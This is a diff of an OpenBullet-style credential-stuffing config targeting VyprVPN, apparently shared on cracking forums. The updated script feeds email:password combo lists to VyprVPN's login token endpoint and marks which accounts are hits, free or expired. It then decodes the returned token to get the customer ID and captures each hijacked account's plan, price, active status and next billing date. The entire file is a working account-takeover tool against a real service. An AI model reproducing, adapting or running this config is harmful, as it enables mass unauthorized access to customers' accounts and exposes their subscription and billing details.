@@ -1,11 +1,11 @@
 [SETTINGS]
 {
-  "Name": "VYPR VPN API",
-  "SuggestedBots": 150,
+  "Name": "VyprVPN(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
   "MaxCPM": 0,
-  "LastModified": "2021-06-27T21:41:14.1684942+05:30",
-  "AdditionalInfo": "Cracked.to/Belegit4554",
-  "Author": "@BELEGIT4554",
+  "LastModified": "2022-03-11T08:59:19.1164281+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
   "Version": "1.4.4 [Anomaly]",
   "IgnoreResponseErrors": false,
   "MaxRedirects": 8,
@@ -16,7 +16,7 @@
   "BanProxyAfterGoodStatus": false,
   "EncodeData": false,
   "AllowedWordlist1": "MailPass",
-  "AllowedWordlist2": "MailPass",
+  "AllowedWordlist2": "Default",
   "DataRules": [],
   "CustomInputs": [],
   "CaptchaUrl": "",
@@ -50,38 +50,133 @@
 }
 
 [SCRIPT]
-#GET REQUEST GET "https://api.goldenfrog.com/settings" 
-  
-  HEADER "X-API-Version: 2" 
-  HEADER "X-API-Features: partial_sign_up;" 
-  HEADER "X-GF-PRODUCT: VyprVPN" 
-  HEADER "X-GF-PRODUCT-VERSION: 3.0.1.10909" 
-  HEADER "X-GF-PLATFORM: Android" 
-  HEADER "X-GF-PLATFORM-VERSION: 4.4.2" 
-  HEADER "locale: en_US" 
+#LOGIN REQUEST POST "https://api.netitude.net/platform-gf/oidc/token" 
+  CONTENT "username=<USER>&password=<PASS>&client_secret=ph-mobile-secret&scope=openid profile groups tenant&grant_type=password&client_id=ph-mobile" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.netitude.net" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Gf-Product-Version: 4.3.0.28" 
+  HEADER "X-Gf-Platform-Version: 15.3.1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Gf-Product: VyprVPN" 
+  HEADER "X-Gf-Platform: iOS" 
+  HEADER "Locale: en_CA" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Gf-Device-Name: iPhone" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 153" 
+  HEADER "User-Agent: VyprVPN/28 CFNetwork/1329 Darwin/21.3.0" 
   HEADER "Connection: close" 
-  HEADER "username: <USER>" 
-  HEADER "X-GF-Agent: VyprVPN Android v3.0.1.10909. (10f7325c)" 
-  HEADER "password: <PASS>" 
-  HEADER "Host: api.goldenfrog.com" 
-  HEADER "Accept-Encoding: gzip" 
-  HEADER "User-Agent: okhttp/3.12.0" 
 
-#Check KEYCHECK 
+KEYCHECK 
   KEYCHAIN Failure OR 
     KEY "invalid username or password" 
-    KEY "locked" 
-  KEYCHAIN Custom "FREE" OR 
-    KEY "confirmed\": true" 
-    KEY "account_level\": \"Free\"" 
+    KEY "error" 
   KEYCHAIN Success OR 
-    KEY "{\"account_level" 
+    KEY "id_token" 
 
-#Subscription PARSE "<SOURCE>" LR "account_level\": \"" "\", \"" -> CAP "Account Level" 
+#TK PARSE "<SOURCE>" JSON "id_token" -> VAR "TK" 
 
-#expired KEYCHECK BanOnToCheck=FALSE 
+#iPHONEX PARSE "<TK>" LR "." "" -> VAR "iPHONEX" 
+
+#BASE64 REQUEST POST "https://www.base64decode.org/" 
+  CONTENT "input=<iPHONEX>&charset=UTF-8" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.base64decode.org" 
+  HEADER "referer: https://www.base64decode.org/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" 
+
+#ID PARSE "<SOURCE>" LR "placeholder=\"Result goes here...\" spellcheck=\"false\">" "</textarea>" -> VAR "ID" 
+
+#ID FUNCTION Replace "&quot;" "" "<ID>" -> VAR "ID" 
+
+#ID PARSE "<ID>" LR ",customer_id:" ",customer_role" -> VAR "ID" 
+
+#GET_SUBSCRIPTIONS REQUEST GET "https://account.vyprvpn.com/api/subscription/customers/<ID>/subscriptions?embed=(sku)" 
+  
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "X-Gf-Product-Version: 4.3.0.28" 
+  HEADER "X-Gf-Platform-Version: 15.3.1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Gf-Product: VyprVPN" 
+  HEADER "Authorization: Bearer <TK>" 
+  HEADER "X-Gf-Platform: iOS" 
+  HEADER "Locale: en_CA" 
+  HEADER "Referer: https://account.vyprvpn.com/overview" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Gf-Device-Name: iPhone" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: VyprVPN/28 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" EqualTo "{\"items\":[]}" 
   KEYCHAIN Custom "EXPIRED" OR 
-    KEY "locked" 
+    KEY ",\"is_terminated\":true," 
+  KEYCHAIN Success OR 
+    KEY "{\"items\":[{" 
+    KEY "{\"items\":[{\"" 
+    KEY "{\"items\":[\"" 
 
-FUNCTION Constant "cracked.to/Belegit4554" -> CAP "Config By" 
+#pay_id PARSE "<SOURCE>" JSON "id" -> VAR "pay_id" 
+
+#sku_id PARSE "<SOURCE>" JSON "sku_id" -> VAR "sku_id" 
+
+#GET_DETAILS REQUEST GET "https://account.vyprvpn.com/api/product/skus/<sku_id>/actions/get-details" 
+  
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "X-Gf-Product-Version: 4.3.0.28" 
+  HEADER "X-Gf-Platform-Version: 15.3.1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Gf-Product: VyprVPN" 
+  HEADER "Authorization: Bearer <TK>" 
+  HEADER "X-Gf-Platform: iOS" 
+  HEADER "Locale: en_CA" 
+  HEADER "Referer: https://account.vyprvpn.com/overview" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Gf-Device-Name: iPhone" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: VyprVPN/28 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Connection: close" 
+
+#Plan_Type PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Plan Type" 
+
+#GET_PAYMENTS REQUEST GET "https://account.vyprvpn.com/api/subscription/customers/<ID>/subscriptions/<pay_id>/actions/get-detail" 
+  
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "X-Gf-Product-Version: 4.3.0.28" 
+  HEADER "X-Gf-Platform-Version: 15.3.1" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Gf-Product: VyprVPN" 
+  HEADER "Authorization: Bearer <TK>" 
+  HEADER "X-Gf-Platform: iOS" 
+  HEADER "Locale: en_CA" 
+  HEADER "Referer: https://account.vyprvpn.com/overview" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "X-Gf-Device-Name: iPhone" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: VyprVPN/28 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "Connection: close" 
+
+#Active PARSE "<SOURCE>" JSON "is_active" CreateEmpty=FALSE -> CAP "Active" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Active>" Contains "false" 
+    KEY "<Active>" Contains "False" 
+
+#Plan_Price PARSE "<SOURCE>" JSON "amount" CreateEmpty=FALSE -> CAP "Plan Price" "$" "" 
+
+#Next_Billing PARSE "<SOURCE>" JSON "next_invoices_at" CreateEmpty=FALSE -> CAP "Next Billing" "$" "" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
 
